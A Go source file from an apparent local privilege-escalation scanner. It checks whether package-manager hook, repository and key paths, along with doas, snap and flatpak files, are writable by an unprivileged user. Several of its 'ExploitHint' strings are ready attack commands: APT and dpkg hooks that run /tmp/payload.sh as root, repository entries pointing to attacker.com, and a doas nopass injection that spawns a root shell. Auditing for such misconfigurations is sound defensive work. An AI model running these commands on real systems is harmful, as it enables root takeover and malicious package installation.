package scanners

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
)

// PackageAuditResult holds findings for package manager misconfigurations
type PackageAuditResult struct {
	Name        string `json:"name"`
	Path        string `json:"path,omitempty"`
	RiskLevel   string `json:"risk_level,omitempty"`
	IsDangerous bool   `json:"is_dangerous"`
	Reason      string `json:"reason"`
	ExploitHint string `json:"exploit_hint,omitempty"`
	IsHookDir   bool   `json:"is_hook_dir,omitempty"`
}

type packageTarget struct {
	ToolName    string
	Path        string
	IsHookDir   bool
	RiskLevel   string
	Reason      string
	ExploitHint string
}

var targetPackagePaths = []packageTarget{
	// --- APT (Debian / Ubuntu / Kali / Mint) ---
	{
		ToolName:    "apt",
		Path:        "/etc/apt/apt.conf.d",
		IsHookDir:   true,
		RiskLevel:   "CRITICAL",
		Reason:      "APT configuration & hook directory is writable. Dropping an APT config allows arbitrary command execution as root during package operations.",
		ExploitHint: "echo 'APT::Update::Pre-Invoke {\"/tmp/payload.sh\";};' > /etc/apt/apt.conf.d/00exploit",
	},
	{
		ToolName:    "dpkg",
		Path:        "/etc/dpkg/dpkg.cfg.d",
		IsHookDir:   true,
		RiskLevel:   "CRITICAL",
		Reason:      "DPKG hook configuration directory is writable. Adding a post-invoke/pre-invoke directive executes arbitrary commands as root during package installations.",
		ExploitHint: "echo 'post-invoke /tmp/payload.sh' > /etc/dpkg/dpkg.cfg.d/00exploit",
	},
	{
		ToolName:    "apt",
		Path:        "/etc/apt/sources.list.d",
		IsHookDir:   false,
		RiskLevel:   "HIGH",
		Reason:      "APT sources.list.d repository directory is writable. An unprivileged user can inject malicious package repositories.",
		ExploitHint: "echo 'deb http://attacker.com/ debian main' > /etc/apt/sources.list.d/evil.list",
	},
	{
		ToolName:    "apt",
		Path:        "/etc/apt/sources.list",
		IsHookDir:   false,
		RiskLevel:   "HIGH",
		Reason:      "APT sources.list repository file is writable by unprivileged user.",
		ExploitHint: "Inject malicious package source mirror into /etc/apt/sources.list",
	},
	{
		ToolName:    "apt",
		Path:        "/etc/apt/trusted.gpg.d",
		IsHookDir:   false,
		RiskLevel:   "HIGH",
		Reason:      "APT trusted GPG keyring directory is writable. An unprivileged user can drop rogue signing keys.",
		ExploitHint: "cp /tmp/evil.gpg /etc/apt/trusted.gpg.d/",
	},

	// --- YUM / DNF (RHEL / CentOS / Fedora / Rocky / Alma) ---
	{
		ToolName:    "dnf",
		Path:        "/etc/dnf/plugins",
		IsHookDir:   true,
		RiskLevel:   "CRITICAL",
		Reason:      "DNF plugin directory is writable. Dropping a custom Python plugin grants automatic root code execution when dnf runs.",
		ExploitHint: "Drop a malicious Python plugin into /etc/dnf/plugins/exploit.py",
	},
	{
		ToolName:    "yum",
		Path:        "/etc/yum/pluginconf.d",
		IsHookDir:   true,
		RiskLevel:   "CRITICAL",
		Reason:      "YUM plugin configuration directory is writable. Unprivileged users can enable or redirect plugin execution.",
		ExploitHint: "Create malicious plugin config in /etc/yum/pluginconf.d/",
	},
	{
		ToolName:    "yum/dnf",
		Path:        "/etc/yum.repos.d",
		IsHookDir:   false,
		RiskLevel:   "HIGH",
		Reason:      "YUM/DNF repository directory is writable. An unprivileged user can inject malicious .repo files.",
		ExploitHint: "echo -e '[evil]\\nname=Evil\\nbaseurl=http://attacker.com\\ngpgcheck=0' > /etc/yum.repos.d/evil.repo",
	},
	{
		ToolName:    "dnf",
		Path:        "/etc/dnf/dnf.conf",
		IsHookDir:   false,
		RiskLevel:   "HIGH",
		Reason:      "DNF main configuration file is writable by unprivileged user.",
		ExploitHint: "Modify /etc/dnf/dnf.conf to disable gpgcheck or configure rogue plugins",
	},
	{
		ToolName:    "yum",
		Path:        "/etc/yum.conf",
		IsHookDir:   false,
		RiskLevel:   "HIGH",
		Reason:      "YUM main configuration file is writable by unprivileged user.",
		ExploitHint: "Modify /etc/yum.conf to disable gpgcheck or add rogue repositories",
	},

	// --- Pacman (Arch / Manjaro) ---
	{
		ToolName:    "pacman",
		Path:        "/etc/pacman.d/hooks",
		IsHookDir:   true,
		RiskLevel:   "CRITICAL",
		Reason:      "Pacman hook directory is writable. Dropping a .hook file executes arbitrary commands as root during package transactions.",
		ExploitHint: "Create a .hook file in /etc/pacman.d/hooks/ with Exec = /tmp/payload.sh",
	},
	{
		ToolName:    "pacman",
		Path:        "/etc/pacman.conf",
		IsHookDir:   false,
		RiskLevel:   "HIGH",
		Reason:      "Pacman configuration file is writable by unprivileged user.",
		ExploitHint: "Inject unauthenticated custom repositories into /etc/pacman.conf",
	},

	// --- APK (Alpine) ---
	{
		ToolName:    "apk",
		Path:        "/etc/apk/repositories",
		IsHookDir:   false,
		RiskLevel:   "HIGH",
		Reason:      "Alpine APK repositories file is writable by unprivileged user.",
		ExploitHint: "Add untrusted package mirror into /etc/apk/repositories",
	},
	{
		ToolName:    "apk",
		Path:        "/etc/apk/keys",
		IsHookDir:   false,
		RiskLevel:   "HIGH",
		Reason:      "Alpine APK trusted keys directory is writable.",
		ExploitHint: "Drop rogue APK signing key into /etc/apk/keys/",
	},
}

// ScanPackages audits package managers, drop-in hook directories, and privilege tools (doas, snap, flatpak)
func ScanPackages() ([]PackageAuditResult, error) {
	var results []PackageAuditResult
	userCtx := GetUserContext()

	// 1. Audit standard drop-in directories and files
	if userCtx != nil {
		for _, target := range targetPackagePaths {
			info, err := os.Stat(target.Path)
			if err != nil {
				continue
			}

			// Check target path itself
			if isStatWritable(info, userCtx) {
				results = append(results, PackageAuditResult{
					Name:        target.ToolName,
					Path:        target.Path,
					RiskLevel:   target.RiskLevel,
					IsDangerous: true,
					Reason:      target.Reason,
					ExploitHint: target.ExploitHint,
					IsHookDir:   target.IsHookDir,
				})
			} else if info.IsDir() {
				// Also check if any existing config file inside the directory is writable
				entries, err := os.ReadDir(target.Path)
				if err == nil {
					for _, entry := range entries {
						if entry.IsDir() {
							continue
						}
						filePath := filepath.Join(target.Path, entry.Name())
						fInfo, fErr := entry.Info()
						if fErr == nil && isStatWritable(fInfo, userCtx) {
							results = append(results, PackageAuditResult{
								Name:        target.ToolName,
								Path:        filePath,
								RiskLevel:   target.RiskLevel,
								IsDangerous: true,
								Reason:      fmt.Sprintf("Existing package configuration file '%s' is writable by unprivileged user.", filePath),
								ExploitHint: target.ExploitHint,
								IsHookDir:   target.IsHookDir,
							})
						}
					}
				}
			}
		}
	}

	// 2. Audit doas
	if res := auditDoas(); res != nil {
		results = append(results, *res)
	}

	// 3. Audit Snap
	if res := auditSnap(); res != nil {
		results = append(results, *res)
	}

	// 4. Audit Flatpak
	if res := auditFlatpak(); res != nil {
		results = append(results, *res)
	}

	return results, nil
}

func isStatWritable(info os.FileInfo, userCtx *UserContext) bool {
	if sys := info.Sys(); sys != nil {
		if stat, ok := sys.(*syscall.Stat_t); ok {
			uid := int(stat.Uid)
			gid := int(stat.Gid)
			mode := uint32(info.Mode().Perm())
			return userCtx.CanWrite(uid, gid, mode)
		}
	}
	return false
}

func auditDoas() *PackageAuditResult {
	// Check if doas.conf exists
	info, err := os.Stat("/etc/doas.conf")
	if err != nil {
		return nil // doas not installed or config missing
	}

	userCtx := GetUserContext()
	isWritable := userCtx != nil && isStatWritable(info, userCtx)

	if isWritable {
		return &PackageAuditResult{
			Name:        "doas",
			Path:        "/etc/doas.conf",
			RiskLevel:   "CRITICAL",
			IsDangerous: true,
			Reason:      "/etc/doas.conf is writable by current user. Arbitrary nopass commands can be injected.",
			ExploitHint: "echo 'permit nopass :tester as root' >> /etc/doas.conf && doas /bin/bash",
		}
	}

	// Check if it's world-readable (bad practice)
	if info.Mode()&0004 != 0 {
		return &PackageAuditResult{
			Name:        "doas",
			Path:        "/etc/doas.conf",
			RiskLevel:   "MEDIUM",
			IsDangerous: true,
			Reason:      "/etc/doas.conf is world-readable. May leak privileged command aliases.",
			ExploitHint: "Read /etc/doas.conf to find commands that don't require a password.",
		}
	}

	// Try to read content to find 'nopass'
	data, err := os.ReadFile("/etc/doas.conf")
	if err == nil && strings.Contains(string(data), "nopass") {
		return &PackageAuditResult{
			Name:        "doas",
			Path:        "/etc/doas.conf",
			RiskLevel:   "HIGH",
			IsDangerous: true,
			Reason:      "/etc/doas.conf contains 'nopass' entries.",
			ExploitHint: "Execute commands with 'doas' without a password.",
		}
	}

	return nil
}

func auditSnap() *PackageAuditResult {
	_, err := exec.LookPath("snap")
	if err != nil {
		return nil
	}

	// Check if snapd socket is writable (unlikely but critical)
	info, err := os.Stat("/run/snapd.socket")
	if err == nil && info.Mode()&0002 != 0 {
		return &PackageAuditResult{
			Name:        "snap",
			Path:        "/run/snapd.socket",
			RiskLevel:   "CRITICAL",
			IsDangerous: true,
			Reason:      "snapd.socket is world-writable.",
			ExploitHint: "Potential for local root via snapd API injection.",
		}
	}

	return nil
}

func auditFlatpak() *PackageAuditResult {
	_, err := exec.LookPath("flatpak")
	if err != nil {
		return nil
	}

	// Check for writable flatpak installations
	info, err := os.Stat("/var/lib/flatpak")
	if err == nil && info.Mode()&0002 != 0 {
		return &PackageAuditResult{
			Name:        "flatpak",
			Path:        "/var/lib/flatpak",
			RiskLevel:   "HIGH",
			IsDangerous: true,
			Reason:      "/var/lib/flatpak is world-writable.",
			ExploitHint: "Inject malicious flatpak apps or override existing ones.",
		}
	}

	return nil
}
